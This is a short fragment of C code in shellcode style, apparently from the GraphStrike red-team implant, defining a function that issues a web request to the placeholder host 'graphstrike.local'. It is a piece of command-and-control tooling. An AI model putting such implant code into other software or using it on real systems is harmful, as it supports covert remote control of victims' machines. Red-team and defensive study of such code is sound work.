...
SECTION( E ) PVOID ResolveAddress(struct MemAddrs* pMemAddrs)
{
    return MakeWebRequest(pMemAddrs->hInternet, C_PTR ( OFFSET ( "graphstrike.local" ) ), C_PTR ( OFFSET ( "/" ) ), GET_VERB, NULL, NULL, pMemAddrs);
};
